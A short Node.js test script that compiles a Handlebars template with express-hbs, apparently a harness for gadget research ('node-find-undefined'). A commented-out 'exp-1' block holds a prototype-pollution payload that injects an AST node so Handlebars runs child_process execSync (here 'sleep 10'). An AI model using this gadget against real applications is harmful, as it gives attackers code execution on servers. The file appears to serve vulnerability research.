const hbs = require('express-hbs');

// exp-1
// Object.prototype.type = 'Program';
// Object.prototype.body = [{
//     "type": "MustacheStatement",
//     "path": 0,
//     "params": [{
//         "type": "NumberLiteral",
//         "value": "console.log(process.mainModule.require('child_process').execSync('sleep 10').toString())"
//     }],
//     "loc": {
//         "start": 0,
//         "end": 0
//     }
// }];

// for node-find-undefined
console.log("="*20+"start"+"="*20+"\n")

const source = `Hello {{ msg }}`;
const template =  hbs.handlebars.compile(source);

template({msg:"World!"})


// for node-find-undefined
console.log("="*20+"end"+"="*20+"\n")

